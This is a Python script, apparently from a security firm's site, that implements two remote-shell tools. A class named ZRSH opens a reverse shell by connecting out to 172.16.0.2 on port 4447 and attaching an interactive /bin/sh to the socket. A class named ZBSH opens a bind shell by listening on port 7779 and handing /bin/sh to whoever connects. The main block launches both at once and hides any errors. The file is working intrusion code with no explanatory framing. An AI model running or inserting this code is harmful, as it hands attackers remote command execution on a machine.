#!/usr/bin/env python
#====================================================================
'''
	Author : K. BEKKOUCHE 
	Web Site : www.zakansecurity.com
	Version: 1.0
	Date: 17/06/2016
'''

#====================================================================

import socket, subprocess, os, threading, time, sys;

class ZRSH(threading.Thread):

	#===
	def __init__(self, ip, port, start_sending):

		threading.Thread.__init__(self)
		self.ip = ip
		self.port = port
		self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.start_sending = start_sending
		self.ready = False
		self.daemon = True
		self.start()
    #===
	def run(self):

		self.ready = True
		self.start_sending.wait ()

		try:

			self.sock.connect((self.ip,self.port));
			os.dup2(self.sock.fileno(),0); 
			os.dup2(self.sock.fileno(),1); 
			os.dup2(self.sock.fileno(),2);
			subprocess.call(["/bin/sh","-i"]);

		except:
			pass

	#===
	def stop(self):
		
		self.sock.close()

#====================================================================
class ZBSH(threading.Thread):

	#===
	def __init__(self, port, start_sending):

		threading.Thread.__init__(self)

		self.port = port
		self.sock = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
		self.sock.bind (('', port))

		self.ready = False
		self.start_sending = start_sending
		self.daemon = True
		self.start()

    #===
	def run (self):

			
		self.ready = True
		self.start_sending.wait ()

		try:
 			
 			self.sock.listen (5)
			conn, addr = self.sock.accept ()
			subprocess.Popen('/bin/sh', shell=True, stdin=conn, stdout=conn, stderr=conn, close_fds=True)

		except:
			pass


	#===
	def stop (self):
	
		self.sock.close ()

#====================================================================
if __name__=='__main__':

	ready_threads = []

	try:

		start_sending = threading.Event()
		
		rsh = ZRSH ( '172.16.0.2', 4447, start_sending)
		bsh = ZBSH ( 7779, start_sending)

		for _ in xrange(500):

			time.sleep(0.1)

			if len(ready_threads) == 2: break
			else:

				for thread in (rsh, bsh):

					if thread.ready and thread not in ready_threads: ready_threads.append(thread)


		#===
		start_sending.set()
		time.sleep(2)

		#===
		for thread in (rsh, bsh):
			thread.join()
	except:

		for thread in ready_threads:
			thread.stop()

		print ('ERROR :',  sys.exc_info()[0])
		raise
		pass


#====================================================================




